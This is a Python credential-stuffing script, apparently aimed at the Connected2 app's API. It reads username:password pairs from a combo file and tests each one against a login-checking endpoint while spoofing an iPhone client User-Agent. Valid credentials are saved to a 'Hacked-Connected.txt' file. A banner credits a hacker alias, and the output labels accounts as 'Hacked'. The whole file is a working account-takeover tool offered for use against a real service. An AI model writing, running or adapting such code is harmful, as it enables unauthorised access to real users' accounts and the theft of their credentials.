try:
	import threading
	from requests import get , post
	from time import sleep
except Exception as Joker:exit(Joker)
PRNT = threading.Lock()
red = "\033[1;31;40m"
yel = '\033[1;33;40m'
grn = '\033[1;32;40m'
wit = "\033[1;37;40m"
bloFT = "\033[1;36;40m"
def vv1ck(*a, **b):
	with PRNT:
		print(*a, **b)
print(f"""
{yel}              __
              || [ Brute Force Connected ]
            (_||_) 
{wit}             ({bloFT}oo{wit})
{red}      /-------\/
     / | Ma3 || {wit}https://vv1ck.github.io{red}
    *  ||----||   {yel} By J0KER @221298
{wit}       ^^    ^^
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def Check_log(user,pess):
	sent = get('https://api.c2me.cc/b/get_birthday_and_gender?nick={}&password={}'.format(user,pess),headers={'Host': 'api.c2me.cc','Accept': '*/*','Accept-Language': 'ar-JO;q=1, en-JO;q=0.9','Connection': 'close','Accept-Encoding': 'gzip, deflate','User-Agent': 'Connected2/1.150.1812281345 (iPhone; iOS 13.5; Scale/2.00)'})
	if 'birthday' in sent.text:
		print(f"{bloFT}┌──(joker㉿root)-[{wit}~connected2.py{bloFT}]\n└─${grn} Hacked >> {user}:{pess}")
		with open('Hacked-Connected.txt', 'a') as J:
			J.write(user+':'+pess+'\n')
	elif 'unauthorized' in sent.text:
		print(f"{bloFT}┌──(joker㉿root)-[{wit}~connected2.py{bloFT}]\n└─${red} Not Hacked >> {user}:{pess}")
	else:print(sent.text)
def EMAIL_File():
	QTR = input('\n[+] Enter the name the combo  file: ')
	try:
		vv1ck('\n\t ━━━━━━━━━━━━ Started ━━━━━━━━━━━━\n')
		for x in open(QTR,'r').read().splitlines():
			if x ==None:exit('\n     ========== completed =========')
			try:user = x.split(":")[0]
			except IndexError:exit('\n     ========== completed =========')
			try:pess = x.split(":")[1];sleep(1);Check_log(user,pess)
			except IndexError:pass
	except FileNotFoundError:print('\n[-] The file name is incorrect !\n');return EMAIL_File()
EMAIL_File()
